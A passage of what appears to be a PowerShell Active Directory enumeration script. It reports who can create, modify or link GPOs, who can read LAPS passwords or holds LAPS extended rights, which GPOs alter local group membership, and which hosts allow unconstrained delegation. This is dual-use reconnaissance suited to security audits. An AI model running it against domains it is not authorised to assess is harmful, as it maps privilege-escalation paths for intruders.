			if(!$NoOutput){$EmptyGroupsResults | Where-Object {$_."Group Name"} | Sort-Object Domain,"Group Name" | Format-Table -AutoSize -Wrap}
			$HTMLEmptyGroups = $EmptyGroupsResults | Where-Object {$_."Group Name"} | Sort-Object Domain,"Group Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='EmptyGroups'>Empty Groups</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='EmptyGroups'>" }
		}
  	}
	
	##################################
    ##################################
    ##################################
	
	$GroupPolicyChecksBanner = "<h3>Group Policy Checks</h3>"
	Write-Host ""
	Write-Host "Group Policy Checks" -ForegroundColor Red
	Write-Host ""
	
	
	#######################################
    ########### GPO Rights ################
	#######################################

    if($GPOsRights -OR $AllEnum){
		
		# Load the required assembly
		Add-Type -AssemblyName System.DirectoryServices
	
		Write-Host ""
		Write-Host "Who can create GPOs" -ForegroundColor Cyan
		$TempGPOCreators = foreach ($AllDomain in $AllDomains) {
			
			# Retrieve the GUID to Name mapping
			$guidMap = $null
			$guidMap = $AllGUIDMappings["$AllDomain"]
			
			$GPOCreators = @()
			$GPOCreators = foreach ($Policy in ($PolicyTargets | Where-Object {$_.domain -eq $AllDomain}).distinguishedname) {
			
				$ldapPath = "LDAP://$Policy"
				$ouEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
				$securityDescriptor = $ouEntry.ObjectSecurity

				foreach ($ace in $securityDescriptor.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])) {
					# Resolve ObjectType and InheritedObjectType using the GUID map
					$objectTypeName = if ($ace.ObjectType -ne [System.Guid]::Empty) { $guidMap[$ace.ObjectType] } else { "Any" }
					$inheritedObjectTypeName = if ($ace.InheritedObjectType -ne [System.Guid]::Empty) { $guidMap[$ace.InheritedObjectType] } else { "Any" }
					#$objectAceType = $guidMap[$ace.ObjectAceType]
					
					# Create a custom object with the resolved names
					[PSCustomObject]@{
						"Delegated Groups" = $ace.IdentityReference.Value
						"Target OU" = $Policy
						#AccessControlType = $ace.AccessControlType
						ObjectType = $objectTypeName
						InheritedObjectType = $inheritedObjectTypeName
						#ObjectAceType = $objectAceType
						ActiveDirectoryRights = $ace.ActiveDirectoryRights
						Domain = $AllDomain
					}
				}
			}
			
			$GPOCreators = @($GPOCreators | Where-Object {$_.ObjectType -eq 'Group-Policy-Container' -AND $_.ActiveDirectoryRights -contains "CreateChild"})
			
			foreach ($GPOCreator in $GPOCreators) {
				if(Test-SidFormat $GPOCreator."Delegated Groups"){
					foreach($SumGroupsUser in $SumGroupsUsers){
						if($GPOCreator."Delegated Groups" -eq (GetSID-FromBytes -sidBytes $SumGroupsUser.objectsid)){
							$TryToExtractMember = $SumGroupsUser
							break
						}
					}
					if($TryToExtractMember){$FinalExtAccount = "$($TryToExtractMember.domain)\$($TryToExtractMember.samaccountname)"}
					else{$FinalExtAccount = $GPOCreator."Delegated Groups"}
				}
				else{
					try {
						$tempholder = $GPOCreator."Delegated Groups"
						$memberSID = New-Object System.Security.Principal.SecurityIdentifier($tempholder)
						$memberUser = $memberSID.Translate([System.Security.Principal.NTAccount])
						$FinalExtAccount = $memberUser.Value
					} catch {
						$FinalExtAccount = $GPOCreator."Delegated Groups"
					}
				}
				
				[PSCustomObject]@{
					"Account" = $FinalExtAccount
					"OU"	  = $GPOCreator."Target OU"
					"Domain" = $AllDomain
				}
			}
		}

		if ($TempGPOCreators) {
			if(!$NoOutput){$TempGPOCreators | Sort-Object Domain,Account | Format-Table -AutoSize -Wrap}
			$HTMLGPOCreators = $TempGPOCreators | Sort-Object Domain,Account | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='GPOCreators'>Who can create GPOs</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='GPOCreators'>" }
		}

        Write-Host ""
        Write-Host "Who can modify existing GPOs" -ForegroundColor Cyan
		$TempGPOsWhocanmodify = foreach ($AllDomain in $AllDomains) {
			
			# Retrieve the GUID to Name mapping
			$guidMap = $null
			$guidMap = $AllGUIDMappings["$AllDomain"]
			
			$jSIDdomain = $TempTargetDomains | Where-Object {$_.Domain -eq $AllDomain} | Select-Object -ExpandProperty "Domain SID"

			$GPOTargets = @($AllCollectedGPOs | Where-Object {$_.domain -eq $AllDomain})
			
			$jGPOIDRAW = @()
			$jGPOIDRAW = foreach ($GPO in $GPOTargets.distinguishedname){
				
				$ldapPath = "LDAP://$GPO"
				$ouEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
				$securityDescriptor = $ouEntry.ObjectSecurity

				foreach ($ace in $securityDescriptor.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])) {
					# Resolve ObjectType and InheritedObjectType using the GUID map
					$objectTypeName = if ($ace.ObjectType -ne [System.Guid]::Empty) { $guidMap[$ace.ObjectType] } else { "Any" }
					$inheritedObjectTypeName = if ($ace.InheritedObjectType -ne [System.Guid]::Empty) { $guidMap[$ace.InheritedObjectType] } else { "Any" }
					
					<# # Do the conversion first ?
					if(Test-SidFormat -SidString $ace.IdentityReference.Value){
						$TargetFinalSID = $SumGroupsUsers | Where-Object {$sid = $null;try {$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop}catch{};$sid -eq $ace.IdentityReference.Value}
						$FinalSID = $TargetFinalSID.samaccountname
						if(!$FinalSID){$FinalSID = $ace.IdentityReference.Value}
					}
					else{$FinalSID = $ace.IdentityReference.Value} #>
					
					if(Test-SidFormat -SidString $ace.IdentityReference.Value){
						foreach($SumGroupsUser in $SumGroupsUsers){
							if($ace.IdentityReference.Value -eq (GetSID-FromBytes -sidBytes $SumGroupsUser.objectsid)){
								$TryToExtractMember = $SumGroupsUser
								break
							}
						}
						if($TryToExtractMember){$FinalModGPOAccount = "$($TryToExtractMember.domain)\$($TryToExtractMember.samaccountname)"}
						else{$FinalModGPOAccount = $ace.IdentityReference.Value}
					}
					else{
						try {
							$tempholder = $ace.IdentityReference.Value
							$memberSID = New-Object System.Security.Principal.SecurityIdentifier($tempholder)
							$memberUser = $memberSID.Translate([System.Security.Principal.NTAccount])
							$FinalModGPOAccount = $memberUser.Value
						} catch {
							$FinalModGPOAccount = $ace.IdentityReference.Value
						}
					}
					
					# Create a custom object with the resolved names
					[PSCustomObject]@{
						"Delegated Groups" = $FinalModGPOAccount
						"Target OU" = $GPO
						#AccessControlType = $ace.AccessControlType
						ObjectType = $objectTypeName
						InheritedObjectType = $inheritedObjectTypeName
						#SecurityIdentifier = $ace.SecurityIdentifier.Value
						ActiveDirectoryRights = $ace.ActiveDirectoryRights
						Domain = $AllDomain
					}
				}
			}
			
			$jGPOIDRAWs = @($jGPOIDRAW | Where-Object {$_.ActiveDirectoryRights -match "CreateChild|WriteProperty|GenericAll" -AND $_."Delegated Groups" -notmatch "SYSTEM|Domain Admins|Enterprise Admins|CREATOR OWNER"})
			
			foreach($jGPOIDRAW in $jGPOIDRAWs){
				
				$VulnerableGPO = $AllCollectedGPOs | Where-Object {$_.distinguishedname -eq $jGPOIDRAW."Target OU"}
				
				[PSCustomObject]@{
					"Policy Name" = $VulnerableGPO.displayName
					"Who can edit" = $jGPOIDRAW."Delegated Groups"
					"Policy Path" = $VulnerableGPO.gpcFileSysPath
					Domain = $AllDomain
				}
			}
		}
			
		if ($TempGPOsWhocanmodify) {
			if(!$NoOutput){$TempGPOsWhocanmodify | Sort-Object Domain,"Policy Name","Who can edit" | Format-Table -AutoSize -Wrap}
			$HTMLGPOsWhocanmodify = $TempGPOsWhocanmodify | Sort-Object Domain,"Policy Name","Who can edit" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='GPOsWhocanmodify'>Who can modify existing GPOs</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='GPOsWhocanmodify'>" }
		}

        Write-Host ""
		Write-Host "Who can link GPOs" -ForegroundColor Cyan
		$TempGpoLinkResults = foreach ($AllDomain in $AllDomains) {
			
			# Retrieve the GUID to Name mapping
			$guidMap = $null
			$guidMap = $AllGUIDMappings["$AllDomain"]
			
			$OurTargetOUs = @($AllCollectedOUs | Where-Object {$_.domain -eq $AllDomain})
			$gpolinkresult = @()
			$gpolinkresult = foreach ($OU in $OurTargetOUs.distinguishedname){
				
				$ldapPath = "LDAP://$AllDomain/$OU"
				$ouEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
				$securityDescriptor = $ouEntry.ObjectSecurity

				foreach ($ace in $securityDescriptor.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])) {
					# Resolve ObjectType and InheritedObjectType using the GUID map
					$objectTypeName = if ($ace.ObjectType -ne [System.Guid]::Empty) { $guidMap[$ace.ObjectType] } else { "Any" }
					$inheritedObjectTypeName = if ($ace.InheritedObjectType -ne [System.Guid]::Empty) { $guidMap[$ace.InheritedObjectType] } else { "Any" }
					
					<# # Do the conversion First ?
					if(!(Test-SidFormat -SidString $ace.IdentityReference.Value)){
						$TargetFinalSID = $SumGroupsUsers | Where-Object {$sid = $null;try {$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop}catch{};$sid -eq $ace.IdentityReference.Value}
						$FinalSID = $TargetFinalSID.samaccountname
						if(!$FinalSID){$FinalSID = $ace.IdentityReference.Value}
					}
					else{$FinalSID = $ace.IdentityReference.Value} #>
					
					if(Test-SidFormat -SidString $ace.IdentityReference.Value){
						foreach($SumGroupsUser in $SumGroupsUsers){
							if($ace.IdentityReference.Value -eq (GetSID-FromBytes -sidBytes $SumGroupsUser.objectsid)){
								$TryToExtractMember = $SumGroupsUser
								break
							}
						}
						if($TryToExtractMember){$FinalLinkGPOAccount = "$($TryToExtractMember.domain)\$($TryToExtractMember.samaccountname)"}
						else{$FinalLinkGPOAccount = $ace.IdentityReference.Value}
					}
					else{
						try {
							$tempholder = $ace.IdentityReference.Value
							$memberSID = New-Object System.Security.Principal.SecurityIdentifier($tempholder)
							$memberUser = $memberSID.Translate([System.Security.Principal.NTAccount])
							$FinalLinkGPOAccount = $memberUser.Value
						} catch {
							$FinalLinkGPOAccount = $ace.IdentityReference.Value
						}
					}
					
					# Create a custom object with the resolved names
					[PSCustomObject]@{
						"Delegated Groups" = $FinalLinkGPOAccount
						"Target OU" = $OU
						#AccessControlType = $ace.AccessControlType
						ObjectType = $objectTypeName
						InheritedObjectType = $inheritedObjectTypeName
						#SecurityIdentifier = $ace.SecurityIdentifier.Value
						ActiveDirectoryRights = $ace.ActiveDirectoryRights
						Domain = $AllDomain
					}
				}
			}
			
			$gpolinkresults = @($gpolinkresult | Where-Object { $_.ObjectType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" })
			
			foreach ($result in $gpolinkresults) {
			
				[PSCustomObject]@{
					"Who can link" = $result."Delegated Groups"
					#"Security Identifier" = $result.SecurityIdentifier
					"Object DN" = $result."Target OU"
					"Object Ace Type" = $result.ObjectType
					"Active Directory Rights" = $result.ActiveDirectoryRights
					Domain = $AllDomain
				}
			}
			
		}
		
		if ($TempGpoLinkResults) {
			if(!$NoOutput){$TempGpoLinkResults | Sort-Object Domain,"Who can link","Object DN" | Format-Table -AutoSize -Wrap}
			$HTMLGpoLinkResults = $TempGpoLinkResults | Sort-Object Domain,"Who can link","Object DN" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='GpoLinkResults'>Who can link GPOs</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='GpoLinkResults'>" }
		}

    }
	
	#####################################
    ########### LAPS GPOs ###############
	#####################################

	if($NoLAPS){}
	else{
		Write-Host ""
		Write-Host "LAPS GPOs" -ForegroundColor Cyan
		$TempLAPSGPOs = foreach ($AllDomain in $AllDomains) {
			$LAPSGPOs = @($AllCollectedGPOs | Where-Object { $_.domain -eq $AllDomain })
			foreach ($LAPSGPO in $LAPSGPOs) {
				
				$LAPSGPOLocation = $LAPSGPO | select-object -ExpandProperty GPCFileSysPath
			
				foreach($LAPSGPOLoc in $LAPSGPOLocation){
					$inputString = Get-Content $LAPSGPOLoc\Machine\Registry.pol
					$splitString = $inputString.Substring($inputString.IndexOf('['), $inputString.LastIndexOf(']') - $inputString.IndexOf('[') + 1)
					$splitString = ($splitString -split '\[|\]').Where{$_ -ne ''}
					$splitString = ($splitString | Out-String) -split "`n"
					$splitString = $splitString.Trim()
					$splitString = $splitString | Where-Object { $_ -ne "" }
					$splitString = $splitString | ForEach-Object {$_.Trim() -replace '[^A-Za-z0-9\s;]', ''}
					if($splitString | Where-Object {$_ -match 'AdmPwdEnabled'}){
						$adminAccountRow = $splitString | Where-Object {$_ -match 'AdminAccountName'}
						if ($adminAccountRow) {
							$LAPSAdminresult = ($adminAccountRow -split ';')[4]
						}
						else{$LAPSAdminresult = "Administrator"}
						
						[PSCustomObject]@{
							"GPO Name" = $LAPSGPO.DisplayName
							"Path Name" = $LAPSGPO.Name
							"LAPS Admin" = $LAPSAdminresult
							"GPC File Sys Path" = $LAPSGPO.GPCFileSysPath
							Domain = $AllDomain
						}
						
						$LAPSAdminresult = $null
					}
					
					$inputString = $null
					$splitString = $null
				}
				
				$LAPSGPOLocation = $null
			}
		}
		
		if ($TempLAPSGPOs) {
			if(!$NoOutput){$TempLAPSGPOs | Sort-Object Domain,"GPO Name" | Format-Table -AutoSize -Wrap}
			$HTMLLAPSGPOs = $TempLAPSGPOs | Sort-Object Domain,"GPO Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='LAPSGPOs'>LAPS GPOs</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='LAPSGPOs'>" }
		}
		
		if($TempLAPSGPOs -AND ($LAPSReadRights -OR $AllEnum)){
			
			# Load the required assembly
			Add-Type -AssemblyName System.DirectoryServices

			Write-Host ""
			Write-Host "Who can read LAPS" -ForegroundColor Cyan
			$TempLAPSCanRead = foreach ($AllDomain in $AllDomains) {
				
				# Retrieve the GUID to Name mapping
				$guidMap = $null
				$guidMap = $AllGUIDMappings["$AllDomain"]
				
				$DomainSelectedOUs = @($AllCollectedOUs | Where-Object {$_.domain -eq $AllDomain})

				# Iterate over each OU
				$Results = @()
				$Results = foreach ($ou in $DomainSelectedOUs.distinguishedname) {
					$ldapPath = "LDAP://$ou"
					$ouEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
					$securityDescriptor = $ouEntry.ObjectSecurity

					foreach ($ace in $securityDescriptor.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])) {
						# Resolve ObjectType and InheritedObjectType using the GUID map
						$objectTypeName = if ($ace.ObjectType -ne [System.Guid]::Empty) { $guidMap[$ace.ObjectType] } else { "Any" }
						$inheritedObjectTypeName = if ($ace.InheritedObjectType -ne [System.Guid]::Empty) { $guidMap[$ace.InheritedObjectType] } else { "Any" }
						
						if(Test-SidFormat $ace.IdentityReference.Value){
							foreach($SumGroupsUser in $SumGroupsUsers){
								if($ace.IdentityReference.Value -eq (GetSID-FromBytes -sidBytes $SumGroupsUser.objectsid)){
									$TryToExtractMember = $SumGroupsUser
									break
								}
							}
							if($TryToExtractMember){$FinalAceAccount = "$($TryToExtractMember.domain)\$($TryToExtractMember.samaccountname)"}
							else{$FinalAceAccount = $ace.IdentityReference.Value}
						}
						else{
							try {
								$tempholder = $ace.IdentityReference.Value
								$memberSID = New-Object System.Security.Principal.SecurityIdentifier($tempholder)
								$memberUser = $memberSID.Translate([System.Security.Principal.NTAccount])
								$FinalAceAccount = $memberUser.Value
							} catch {
								$FinalAceAccount = $ace.IdentityReference.Value
							}
						}

						# Create a custom object with the resolved names
						[PSCustomObject]@{
							"Delegated Groups" = $FinalAceAccount
							"Target OU" = $ou
							#AccessControlType = $ace.AccessControlType
							ObjectType = $objectTypeName
							InheritedObjectType = $inheritedObjectTypeName
							ActiveDirectoryRights = $ace.ActiveDirectoryRights
							Domain = $AllDomain
						}
					}
				}

				$Results | Where-Object {$_.ObjectType -eq 'ms-Mcs-AdmPwd' -AND ($_.ActiveDirectoryRights -match 'ReadProperty')}
			}
			
			if ($TempLAPSCanRead | Where-Object {$_."Delegated Groups" -ne $null}) {
				if(!$NoOutput){$TempLAPSCanRead | Where-Object {$_."Delegated Groups" -ne $null} | Sort-Object Domain,"Delegated Groups","Target OU" | Format-Table -AutoSize -Wrap}
				$HTMLLAPSCanRead = $TempLAPSCanRead | Where-Object {$_."Delegated Groups" -ne $null} | Sort-Object Domain,"Delegated Groups","Target OU" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='LAPSCanRead'>Who can read LAPS</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='LAPSCanRead'>" }
			}
  		}

  		if($TempLAPSGPOs -AND ($LAPSExtended -OR $AllEnum)){
			
			# Load the required assembly
			Add-Type -AssemblyName System.DirectoryServices
			
			Write-Host ""
			Write-Host "LAPS Extended Rights" -ForegroundColor Cyan
			
			$TempLAPSExtended = foreach ($AllDomain in $AllDomains) {
				
				# Retrieve the GUID to Name mapping
				$guidMap = $null
				$guidMap = $AllGUIDMappings["$AllDomain"]
				
				$TargetingDomainMachines = @($TotalEnabledMachines | Where-Object {$_.domain -eq $AllDomain -AND $_."ms-mcs-admpwdexpirationtime"})
				
				# Iterate over each Machine
				$Results = @()
				$Results = foreach ($comp in $TargetingDomainMachines) {
					$distname = $comp.distinguishedname
					$ldapPath = "LDAP://$distname"
					$ouEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
					$securityDescriptor = $ouEntry.ObjectSecurity
					
					foreach ($ace in $securityDescriptor.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])) {
						# Resolve ObjectType and InheritedObjectType using the GUID map
						$objectTypeName = if ($ace.ObjectType -ne [System.Guid]::Empty) { $guidMap[$ace.ObjectType] } else { "Any" }
						$inheritedObjectTypeName = if ($ace.InheritedObjectType -ne [System.Guid]::Empty) { $guidMap[$ace.InheritedObjectType] } else { "Any" }

						if($ace.ObjectType -match "All" -and $ace.IdentityReference -notmatch "BUILTIN") { $Status = "Non Delegated by Admin" }

						if(Test-SidFormat -SidString $ace.IdentityReference.Value){
							foreach($SumGroupsUser in $SumGroupsUsers){
								if($ace.IdentityReference.Value -eq (GetSID-FromBytes -sidBytes $SumGroupsUser.objectsid)){
									$TryToExtractMember = $SumGroupsUser
									break
								}
							}
							if($TryToExtractMember){$FinalExtendedAccount = "$($TryToExtractMember.domain)\$($TryToExtractMember.samaccountname)"}
							else{$FinalExtendedAccount = $ace.IdentityReference.Value}
						}
						else{
							try {
								$tempholder = $ace.IdentityReference.Value
								$memberSID = New-Object System.Security.Principal.SecurityIdentifier($tempholder)
								$memberUser = $memberSID.Translate([System.Security.Principal.NTAccount])
								$FinalExtendedAccount = $memberUser.Value
							} catch {
								$FinalExtendedAccount = $ace.IdentityReference.Value
							}
						}
      						
						# Create a custom object with the resolved names
						[PSCustomObject]@{
							"Computer Name" = $comp.samaccountname
							"Identity" = $FinalExtendedAccount
							#AccessControlType = $ace.AccessControlType
							ObjectType = $objectTypeName
							InheritedObjectType = $inheritedObjectTypeName
							ActiveDirectoryRights = $ace.ActiveDirectoryRights
							"Status" = $Status
							Domain = $AllDomain
						}
					}
				}
				
				$Results | Where-Object {$_.ActiveDirectoryRights -match 'ExtendedRight' -AND $_.ObjectType -eq 'ms-Mcs-AdmPwd'}
				
			}
			
			if ($TempLAPSExtended) {
				if(!$NoOutput){$TempLAPSExtended | Sort-Object Domain,"Computer Name","Identity" | Format-Table -AutoSize -Wrap}
				$HTMLLAPSExtended = $TempLAPSExtended | Sort-Object Domain,"Computer Name","Identity" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='LAPSExtended'>LAPS Extended Rights</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='LAPSExtended'>" }
			}
  		}
		
		if($TempLAPSGPOs -AND ($LAPSComputers -OR ($AllEnum -AND $Force))){

			Write-Host ""
			Write-Host "Computer objects where LAPS is enabled" -ForegroundColor Cyan
			$TempLapsEnabledComputers = foreach ($AllDomain in $AllDomains) {
				$LapsEnabledComputers = @($TotalEnabledMachines | Where-Object {$_.domain -eq $AllDomain -AND $_."ms-Mcs-AdmPwdExpirationTime" -ne $null})
				foreach ($LapsEnabledComputer in $LapsEnabledComputers) {
					if($LapsEnabledComputer.DnsHostName){$IPAddress = Resolve-DnsName -Name $LapsEnabledComputer.DnsHostName -Type A | Select-Object -ExpandProperty IPAddress}
					if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
					[PSCustomObject]@{
						"Name" = $LapsEnabledComputer.samaccountname
						"IP Address" = $IPAddress
						"Account SID" = GetSID-FromBytes -sidBytes $LapsEnabledComputer.objectsid
						Domain = $AllDomain
					}
					$IPAddress = $null
				}
			}
			
			if ($TempLapsEnabledComputers) {
				if(!$NoOutput){$TempLapsEnabledComputers | Sort-Object Domain,"Name" | Format-Table -AutoSize -Wrap}
				$HTMLLapsEnabledComputers = $TempLapsEnabledComputers | Sort-Object Domain,"Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='LapsEnabledComputers'>Computer objects where LAPS is enabled</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='LapsEnabledComputers'>" }
			}
		}
		
	}
	
	##########################################
    ########### AppLocker GPOs ###############
	##########################################
    
	if($NoAppLocker){}
	else{
		Write-Host ""
		Write-Host "AppLocker GPOs" -ForegroundColor Cyan
		$TempAppLockerGPOs = foreach ($AllDomain in $AllDomains) {
			$AppLockerGPOs = @($AllCollectedGPOs | Where-Object { $_.domain -eq $AllDomain -AND $_.DisplayName -like "*AppLocker*" })
			foreach ($AppLockerGPO in $AppLockerGPOs) {
				[PSCustomObject]@{
					"Display Name" = $AppLockerGPO.DisplayName
					"GPC File Sys Path" = $AppLockerGPO.GPCFileSysPath
					Domain = $AllDomain
				}
			}
		}
		
		if ($TempAppLockerGPOs) {
			if(!$NoOutput){$TempAppLockerGPOs | Sort-Object Domain,"Display Name" | Format-Table -AutoSize -Wrap}
			$HTMLAppLockerGPOs = $TempAppLockerGPOs | Sort-Object Domain,"Display Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='AppLockerGPOs'>AppLocker GPOs</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='AppLockerGPOs'>" }
		}
	}
	
	####################################################################
    ########### GPOs that modify local group memberships ###############
	####################################################################
	
	if($MoreGPOs -OR $AllEnum){
        	Write-Host ""
		Write-Host "GPOs that modify local group memberships" -ForegroundColor Cyan
		
		# Loop through each relevant GPO
		$TempGPOLocalGroupsMembership = foreach($AllDomain in $AllDomains) {
		    foreach ($gpo in ($AllCollectedGPOs | Where-Object {$_.domain -eq $AllDomain})) {
		        $gpoPath = $gpo.gpcfilesyspath.TrimStart("[").TrimEnd("]")
		        $gpoDisplayName = $gpo.displayname
		        
		        # Initialize collections for MemberOf and Members
		        $memberOfCollection = @()
		        $membersCollection = @()
				$filtersCollection = @()
		
		        $GPOGuid = ($gpo.gpcfilesyspath -split "}")[-2].split("{")[-1]  # Extracting the GPO's GUID
		        $TargetOUs = @($AllCollectedOUs | Where-Object { $_.domain -eq $AllDomain -AND $_.gplink -like "*$GPOGuid*" })
		        $OUs = $TargetOUs.name -Join " - "
		
		        # Check for Restricted Groups settings in GptTmpl.inf
		        $restrictedGroupsPath = Join-Path -Path $gpoPath -ChildPath "MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
		        $groupsXmlPath = Join-Path -Path $gpoPath -ChildPath "MACHINE\Preferences\Groups\Groups.xml"
		
		        if (Test-Path $restrictedGroupsPath) {
				$restrictedGroupsContent = Get-Content -Path $restrictedGroupsPath -Raw
	
				if ($restrictedGroupsContent -match "\[Group Membership\]") {
					$lines = $restrictedGroupsContent -split "`r`n" | Where-Object { $_ -match "__Member" }
	
					foreach ($line in $lines) {
						if ($line -match "\*(?<sid>S-1-5-\d+(-\d+){3,})__(?<role>.+?)\s*=\s*(?<values>.*)") {
							$sid = $Matches['sid']
							$role = $Matches['role']
							$values = $Matches['values'].Trim()
	
							# Initialize userName in case SID translation fails
							$userName = $null
	
							try {
								$objSID = New-Object System.Security.Principal.SecurityIdentifier($sid)
								$objUser = $objSID.Translate([System.Security.Principal.NTAccount])
								$userName = $objUser.Value
							} catch {}
	
							# Fallback to manually extracting the user/group name if SID translation fails
							if(!$userName){
								$ExtractedMember = @($SumGroupsUsers | Where-Object {$sid -eq (GetSID-FromBytes -sidBytes $_.objectsid)})
								$tempmembername = $ExtractedMember.samaccountname
								$memberdomain = $ExtractedMember.domain
								$userName = ($memberdomain -split "\.")[0] + "\" + $tempmembername
							}
	
							# Split the values by "," to support multiple entries
							if($values -eq ""){}
							else{
								$memberValues = $values -split "," | ForEach-Object { $_.TrimStart("*") }
	
								# Translate member SIDs to names
								$memberNames = $memberValues | ForEach-Object {
									$tempholder = $_
									if(Test-SidFormat $tempholder){
										foreach($SumGroupsUser in $SumGroupsUsers){
											if($tempholder -eq (GetSID-FromBytes -sidBytes $SumGroupsUser.objectsid)){
												$TryToExtractMember = $SumGroupsUser
												break
											}
										}
										if($TryToExtractMember){"$($TryToExtractMember.domain)\$($TryToExtractMember.samaccountname)"}
										else{$tempholder}
									}
									else{
										try {
											$tempholder = $_
											$memberSID = New-Object System.Security.Principal.SecurityIdentifier($tempholder)
											$memberUser = $memberSID.Translate([System.Security.Principal.NTAccount])
											$memberUser.Value
										} catch {
											$tempholder
										}
									}
								}
								
								# Accumulate MemberOf and Members data
								if ($role -eq 'MemberOf') {
									$memberOfCollection += $memberNames
								} elseif ($role -eq 'Members') {
									$membersCollection += $memberNames
								}
							}
						}
					}
				
				# Collect the result
				[PSCustomObject]@{
					"GPO Display Name" = $gpoDisplayName
					"User/Group Name" = $userName
					"MemberOf" = $memberOfCollection -join ', '
					"Members" = $membersCollection -join ', '
					"Target OUs" = $OUs
					"Filters" = N/A
					Domain = $AllDomain
				}
				
				}
			}
				
			if (Test-Path $groupsXmlPath) {
		            # New logic to handle Groups.xml
		            [xml]$xmlContent = Get-Content -Path $groupsXmlPath
		
		            # Loop through each <Group> node
		            foreach ($group in $xmlContent.Groups.Group) {
		                $groupName = $group.Properties.groupName
		                $groupSid = $group.Properties.groupSid
		                $members = $group.Properties.Members.Member
		
		                foreach ($member in $members) {
		                    $memberName = $member.name
		                    $memberAction = $member.action
		                    $memberSid = $member.sid
		                    
		                    # Add to collections based on action and SID translation logic
		                    if ($memberAction -eq "ADD") {
		                        # Translate SID to name if necessary
		                        try {
		                            $objSID = New-Object System.Security.Principal.SecurityIdentifier($memberSid)
		                            $objUser = $objSID.Translate([System.Security.Principal.NTAccount])
		                            $translatedName = $objUser.Value
		                        } catch {
		                            $translatedName = $memberName  # Fallback if SID translation fails
		                        }
		
		                        # Add to members collection
		                        $membersCollection += $translatedName
		                    }
		                }
						
						# Extract FilterComputer information
		                $filters = $group.Filters.FilterComputer
		                foreach ($filter in $filters) {
		                    $filterName = $filter.name
		                    if ($filterName) {
		                        $filtersCollection += $filterName
		                    }
		                }
		
		                # Collect the result for each group processed
		                [PSCustomObject]@{
		                    "GPO Display Name" = $gpoDisplayName
		                    "User/Group Name" = $groupName
		                    "MemberOf" = $memberOfCollection -join ', '
		                    "Members" = $membersCollection -join ', '
		                    "Target OUs" = $OUs
							"Filters" = $filtersCollection -join ', '
		                    Domain = $AllDomain
		                }
		            }
		        }
		    }
		}
		
		if ($TempGPOLocalGroupsMembership) {
			if(!$NoOutput){$TempGPOLocalGroupsMembership | Sort-Object -Unique "Domain", "GPO Display Name", "User/Group Name" | Format-Table -AutoSize -Wrap}
			$HTMLGPOLocalGroupsMembership = $TempGPOLocalGroupsMembership | Sort-Object -Unique "Domain", "GPO Display Name", "User/Group Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='GPOLocalGroupsMembership'>GPOs that modify local group memberships</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='GPOLocalGroupsMembership'>" }
		}
	}
		
	##################################
	##################################
	##################################
	
	$DelegationChecksBanner = "<h3>Delegations and Permissions</h3>"
	Write-Host ""
	Write-Host "Delegations and Permissions" -ForegroundColor Red
	Write-Host ""
	
	####################################################
	########### Unconstrained Delegation ###############
	####################################################
	
	Write-Host ""
	Write-Host "Unconstrained Delegation" -ForegroundColor Cyan
	$TempUnconstrained = foreach ($AllDomain in $AllDomains) {
		#$ResolveServer = $RIDRoleDCs | Where-Object {$matched = $false;foreach ($Extr in $ExtrDCs) {if ($_.dnshostname -eq "$Extr.$AllDomain") {$matched = $true;break}}$matched} | Select-Object -ExpandProperty dnshostname
		$Unconstrained = @($TotalEnabledMachines | Where-Object {$_.domain -eq $AllDomain -AND $TotalDomainControllers.dnshostname -notcontains $_.dnshostname -AND $_.userAccountControl -band 524288 })
		foreach ($Computer in $Unconstrained) {
			if($Computer.DnsHostName){$ipAddress = Resolve-DnsName -Name $Computer.DnsHostName -Type A | Select-Object -ExpandProperty IPAddress}
			if($ipAddress.count -gt 1){$ipAddress = $ipAddress -join ", "}
			[PSCustomObject]@{
				"Name" = $Computer.samaccountname
				"Enabled" = if ($Computer.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if(!$Computer.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $Computer.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
				"IP Address" = $ipAddress
				"Operating System" = $Computer.operatingsystem
				"Account SID" = GetSID-FromBytes -sidBytes $Computer.objectsid
				"Domain" = $AllDomain
			}
			$ipAddress = $null
		}
	}

	if ($TempUnconstrained) {
		if(!$NoOutput){$TempUnconstrained | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap}
